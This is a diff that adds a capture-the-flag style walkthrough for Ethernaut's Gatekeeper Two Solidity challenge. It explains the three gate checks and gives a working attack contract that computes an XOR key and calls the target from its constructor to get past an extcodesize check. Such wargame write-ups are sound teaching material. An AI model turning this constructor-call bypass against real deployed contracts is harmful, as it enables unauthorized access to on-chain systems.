@@ -779,3 +779,62 @@ If the value returned is the wallet address, then we've have successfully passed
 
 ## Level Completed
 ![Level Complete Output](assets/gatekeeper1.png)
+
+
+# Ethernaut Level 15: Gatekeeper Two
+
+## Strategy
+
+- **Vulnerability**:
+  1. **Gate One**: Requires the call to originate from a contract (`msg.sender != tx.origin`).
+  2. **Gate Two**: Requires the caller contract’s code size to be 0, which only happens **during its constructor**.
+  3. **Gate Three**: A bitwise XOR trick – the key must satisfy:
+     ```solidity
+     uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ _gateKey == 0xFFFFFFFFFFFFFFFF
+     ```
+     So, `_gateKey = keccak256(msg.sender) ^ max(uint64)`.
+
+- **Exploit**: I deployed a contract that:
+  - Calculates the correct `_gateKey` using its own address and XOR,
+  - Calls `enter()` from the constructor to ensure `extcodesize == 0`,
+  - Uses itself (a contract) to bypass `msg.sender != tx.origin`.
+
+---
+
+## Commands Used
+
+### 1. Attack Contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract GatekeeperTwoAttack {
+    constructor(address target) {
+        IGatekeeperTwo gate = IGatekeeperTwo(target);
+
+        bytes8 key = bytes8(
+            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
+        );
+
+        gate.enter(key); // Called from constructor
+    }
+}
+```
+This contract satisfies all three gate conditions when deployed.
+
+---
+
+### 2. Check if level is solved
+```
+await contract.entrant()
+```
+If it returns my wallet address, I successfully passed all gates and completed the level.
+
+---
+
+## Level Completed
+![Level Complete Output](assets/GateKeeper2.png)
